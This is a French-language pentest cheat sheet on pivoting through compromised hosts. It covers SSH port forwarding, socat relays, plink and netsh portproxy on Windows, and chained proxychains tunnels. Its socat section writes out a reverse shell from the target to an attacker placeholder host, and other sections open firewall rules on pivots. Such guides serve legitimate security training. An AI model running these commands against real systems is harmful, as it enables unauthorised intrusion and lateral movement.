# 17 — Port Redirection and SSH Tunneling

## Objectifs
Atteindre un service non routable depuis l'attaquant, via un hôte compromis : redirections locales, SSH, socat, et équivalents Windows.

---

## 1. Choisir la technique

| Situation | Technique |
|---|---|
| SSH sortant autorisé, pas de shell root | `ssh -L` / `-R` / `-D` |
| Pas de SSH, binaire à uploader | socat, chisel |
| Cible Windows sans SSH | `plink.exe`, `netsh interface portproxy` |
| Plusieurs services | tunnel SOCKS (`-D` ou chisel) + proxychains |
| Service local uniquement sur la cible | reverse port forward |

---

## 2. SSH : les trois modes

### Local port forwarding (`-L`)
« Mon port local → service distant via le serveur SSH »

```bash
# Accéder au 3306 de DB (joignable seulement depuis PIVOT) sur mon 127.0.0.1:3306
ssh -L 127.0.0.1:3306:10.10.10.50:3306 <USER>@<PIVOT>

# Puis
mysql -h 127.0.0.1 -P 3306 -u root -p
```

```bash
# En arrière-plan
ssh -f -N -L 8080:127.0.0.1:80 <USER>@<PIVOT>
```

### Remote port forwarding (`-R`)
« Mon port local exposé sur la cible »

```bash
# Depuis la cible compromise : exposer mon serveur web local (80) sur le port 8080 de la cible
ssh -R 8080:127.0.0.1:80 <USER>@<LHOST>
# Depuis la cible : curl http://127.0.0.1:8080
```

Usage typique : la cible n'a pas d'accès sortant HTTP mais peut faire du SSH.

### Dynamic (SOCKS) `-D`
```bash
ssh -D 1080 -N -f <USER>@<PIVOT>
# /etc/proxychains4.conf : socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn -p80,445,3389 10.10.10.0/24
```

> `proxychains` ne gère pas ICMP → toujours `-sT -Pn`.

---

## 3. Fichier de config SSH (plus propre)

```bash
# ~/.ssh/config
Host pivot
    HostName <PIVOT>
    User <USER>
    IdentityFile ~/.ssh/id_rsa
    LocalForward 3306 10.10.10.50:3306
    DynamicForward 1080
```

```bash
ssh -N pivot
```

---

## 4. socat

### Bind shell / reverse shell
```bash
# Côté cible : reverse shell
socat TCP:<LHOST>:4444 EXEC:/bin/bash

# Côté attaquant
socat -d -d TCP-LISTEN:4444 STDOUT
```

### Redirection de port
```bash
# Sur la cible : écoute sur 8080 et relaie vers un service interne
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.50:80

# Depuis l'attaquant
curl http://<PIVOT>:8080
```

### TTY complet
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

### Relais UDP/DNS
```bash
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53
```

---

## 5. Windows

### plink (PuTTY)
```cmd
:: Local forward : accéder au 3389 d'une machine interne via le pivot Windows
plink.exe -ssh -l <USER> -pw <PASS> -L 127.0.0.1:3389:10.10.10.50:3389 <PIVOT>

:: Reverse : exposer mon 80 sur le pivot
plink.exe -ssh -l <USER> -pw <PASS> -R 8080:127.0.0.1:80 <LHOST>
```
Accepter la clé hôte : `echo y | plink.exe ...` (ou `-batch`).

### netsh portproxy (admin requis)
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50
netsh interface portproxy show all
netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=8080
:: supprimer
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Autres
```cmd
:: RDP vers une machine interne
mstsc /v:10.10.10.50

:: PowerShell (si admin)
New-NetFirewallRule -DisplayName fwd -Direction Inbound -LocalPort 8080 -Protocol TCP -Action Allow
```

---

## 6. Scénario multi-niveaux

```
Attaquant (tun0) ── PIVOT1 (10.10.10.10, 172.16.5.10)
                      └── PIVOT2 (172.16.5.20, 192.168.1.20)
                            └── CIBLE (192.168.1.30:445)
```

```bash
# 1. Tunnel vers PIVOT1
ssh -D 1080 -N -f <USER>@10.10.10.10

# 2. Depuis PIVOT1, tunnel vers PIVOT2 (via proxychains)
proxychains4 ssh -D 1081 -N -f <USER>@172.16.5.20

# 3. Chaîner les deux SOCKS
cat >> /etc/proxychains4.conf <<'EOF'
strict_chain
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF

proxychains4 netexec smb 192.168.1.30 -u <USER> -p <PASS>
```

---

## 7. proxychains : configuration

```bash
sudo nano /etc/proxychains4.conf
```

```
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

```bash
# Tests
proxychains4 curl -s ifconfig.me
proxychains4 nmap -sT -Pn -p22,80,445 10.10.10.0/24
```

Limites : pas d'ICMP, lent, certains binaires statiques ne passent pas. Préférer `nmap -sT -Pn` et éviter `-sS`.

---

## 8. Dépannage

| Symptôme | Cause |
|---|---|
| `channel 2: open failed` | service cible non joignable depuis le pivot |
| `bind: Address already in use` | port local occupé |
| proxychains timeout | mauvais port/type SOCKS, ou `proxy_dns` manquant |
| SSH demande un mot de passe en boucle | clé, `-o PreferredAuthentications=password` |
| Tunnel se ferme | ajouter `-N -f` et `-o ServerAliveInterval=30` |
| Windows : plink bloque sur la clé | `echo y |` ou `-batch` |

```bash
# Vérifier qu'un port écoute
ss -tulpn | grep <PORT>
```

---

## 9. Checklist

- [ ] Interfaces réseau du pivot cartographiées (`ip a`, `ip route`)
- [ ] Service cible joignable depuis le pivot confirmé
- [ ] Méthode choisie (SSH / socat / chisel / netsh)
- [ ] Tunnel monté et testé (curl/nc)
- [ ] proxychains configuré si SOCKS
- [ ] Accès au service confirmé
- [ ] Tunnel documenté (commande exacte)
